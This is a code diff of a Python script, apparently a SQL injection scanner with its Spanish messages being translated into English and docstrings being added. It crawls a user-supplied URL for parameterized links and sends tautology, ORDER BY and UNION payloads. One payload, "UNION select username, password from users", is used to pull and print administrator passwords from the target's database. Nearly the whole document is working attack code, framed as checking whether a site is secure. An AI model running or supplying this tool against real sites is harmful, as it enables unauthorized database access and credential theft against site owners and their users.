@@ -9,24 +9,56 @@ from requests.exceptions import SSLError, ConnectionError
 
 proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}
 
-# request with retries
 def get_response(url, retries=3):
+    """
+    Sends an HTTP GET request to the specified URL, with retries in case of failure.
+
+    Args:
+        url (str): The URL to send the request to.
+        retries (int): The number of times to retry the request in case of failure. Default is 3.
+
+    Returns:
+        Response object if the request is successful (status code 200).
+        Returns None if the maximum number of retries is reached without success.
+    
+    Raises:
+        Prints a message if the request results in an error (e.g., ConnectionError, SSLError).
+    """
     for i in range(retries):
         try:
             r = requests.get(url, verify=False, proxies=proxies, timeout=10)
             if r.status_code == 200:
                 return r
             elif r.status_code == 403:
-                print(f"[+] Felicitaciones, su página web es segura: el acceso a {url} fue bloqueado con un código 403 (Forbidden).")
+                print(f"[+] Congratulations, your website is secure: access to {url} was blocked with a 403 (Forbidden) code.")
                 return r
         except (requests.RequestException, SSLError, ConnectionError) as e:
-            print(f"[-] Error en la conexión a {url}: {e}")
+            print(f"[-] Connection error to {url}: {e}")
             time.sleep(random.uniform(1, 3))
     print(f"[-] Failed to retrieve {url} after {retries} retries.")
     return None
 
 # try to get paths with get parameter
 def find_urls_to_test(url, base_url):
+    """
+    Attempts to discover URLs with GET parameters from the given page.
+
+    Args:
+        url (str): The URL of the page to be analyzed.
+        base_url (str): The base URL used to build full URLs from relative links.
+
+    Returns:
+        set: A set of discovered URLs containing query parameters or potential targets.
+
+    Description:
+        - Retrieves the content of the page specified by `url`.
+        - Parses the HTML and looks for `<a>` tags to extract links.
+        - Builds full URLs from relative links based on the base URL.
+        - Filters out links that don't match the base URL's domain.
+        - Additionally searches through `<script>` content if no parameterized URLs are found.
+        - Returns a set of URLs to test for vulnerabilities.
+    """
+    
     response = get_response(url)
     if not response:
         return set()
@@ -68,8 +100,25 @@ def find_urls_to_test(url, base_url):
     
     return links
 
-# perform SQL injection to find the administrator's password
 def exploit_sqli_users_table(url):
+    """
+    Performs SQL injection to attempt to retrieve the administrator's password from the users table.
+
+    Args:
+        url (str): The URL to target for SQL injection.
+
+    Returns:
+        bool: True if the administrator's password is found, False otherwise.
+
+    Description:
+        - Constructs a SQL injection payload to extract the 'username' and 'password' from the 'users' table.
+        - Sends a request with the SQL payload appended to the URL.
+        - If the response is in HTML format, it parses the content for common usernames.
+        - If a username is found, it retrieves the associated password and prints it.
+        - Returns True if the password is successfully found, otherwise returns False.
+        - Handles SSL errors and other request-related exceptions.
+    """
+    
     common_usernames = ['administrator', 'admin', 'root', 'superuser', 'sysadmin']
     sql_payload = "' UNION select username, password from users--"
     #r = requests.get(url + sql_payload, verify=False, proxies=proxies)
@@ -82,11 +131,11 @@ def exploit_sqli_users_table(url):
     if "text/html" in r.headers.get("Content-Type", ""):
         soup = BeautifulSoup(r.text, 'html.parser')
     else:
-        print("[-] La respuesta no es de tipo HTML.")
+        #print("[-] The response is not HTML type.")
         return False
     
     if not soup.body:
-        print("[-] No se pudo encontrar el cuerpo HTML en la respuesta.")
+        print("[-] The body is not in the HTML response.")
         return False
     
     for username in common_usernames:
@@ -96,16 +145,30 @@ def exploit_sqli_users_table(url):
             password_element = parent.findNext('td') if parent else None
             if password_element and password_element.contents:
                 admin_password = password_element.contents[0]
-                print(f"[+] Encontramos la contraseña del usuario '{username}': '{admin_password}'")
+                print(f"[+] User password found for '{username}': '{admin_password}")
                 return True
-        else:
-            print(f"[-] No se encontró el usuario '{username}' en la respuesta.")
+        #else:
+            #print(f"[-] User '{username}' not found in the response.")
     
     return False
 
-
-# perform the SQL injection
 def exploit_sqli(url):
+    """
+    Attempts to perform SQL injection on the target URL using a list of common payloads.
+
+    Args:
+        url (str): The target URL for the SQL injection test.
+
+    Returns:
+        bool: True if a vulnerable URL is found, False otherwise.
+
+    Description:
+        - Iterates through a list of common SQL injection payloads.
+        - Appends each payload to the target URL and sends an HTTP request.
+        - If the response contains an "Internal Server Error", the URL is likely vulnerable.
+        - Handles SSL and request-related errors.
+        - Returns True if a vulnerable URL is identified, otherwise returns False.
+    """
     payloads = [
         "' OR '1'='1",
         "' OR '1'='1' --",
@@ -122,21 +185,36 @@ def exploit_sqli(url):
     for payload in payloads:
         target_url = url + payload
         try:
-            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)  # Añadido timeout y verify=False
+            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
             if "Internal Server Error" in r.text:
                 print(f"[+] Vulnerable URL found with payload {payload}")
                 return True
-        except SSLError as e:  # Añadido manejo de SSLError
+        except SSLError as e:
             print(f"[-] SSL Error en {target_url}: {e}")
             return False
-        except requests.RequestException as e:  # Añadido manejo de errores generales de solicitudes
+        except requests.RequestException as e:
             print(f"[-] Request error en {target_url}: {e}")
             return False
 
     return False
 
-# function that detects the number of columns in the database to detect errors
 def exploit_sqli_column_number(url):
+    """
+    Attempts to detect the number of columns in the database using SQL injection.
+
+    Args:
+        url (str): The target URL for testing column numbers in SQL injection.
+
+    Returns:
+        int or bool: The number of columns if detected, or False in case of an error.
+
+    Description:
+        - Iterates through a range of column numbers (1 to 4) and appends the SQL 'ORDER BY' clause to the target URL.
+        - Sends an HTTP request to test the response for each column count.
+        - If an "Internal Server Error" is encountered, the number of columns is considered to be one less than the current iteration.
+        - Handles SSL and request-related exceptions.
+        - Returns the number of columns or False if an error occurs or if no column number is determined.
+    """
     for i in range(1, 5):
         target_url = url + "'+order+by+%s--" % i
         try:
@@ -153,10 +231,10 @@ def exploit_sqli_column_number(url):
 
 if __name__ == "__main__":
     
-    base_url = input("Ingrese la URL que quiere escanear: ").strip()
+    base_url = input("Enter the URL you want to scan:  ").strip()
     base_url = base_url.rstrip('/')
 
-    print("[+] Inspeccionando las distintas rutas para la pagina ingresada...")
+    print("[+] Inspecting the different paths for the entered page...")
     urls_to_test = find_urls_to_test(base_url, base_url)
 
     if urls_to_test:
@@ -175,8 +253,8 @@ if __name__ == "__main__":
             if not is_vulnerable:
                 num_col = exploit_sqli_column_number(test_url)
                 if num_col:
-                    print(f"[+] Vulnerable URL found: {test_url}")
-                    print(f"[+] Pudimos determinar que su base de datos tiene {num_col} columnas en esta URL")
+                    #print(f"[+] Vulnerable URL found: {test_url}")
+                    print(f"[+] We determined that your database has {num_col} columns at this URL")
                 else:
                     print("[-] URL not vulnerable to sql injection")
             
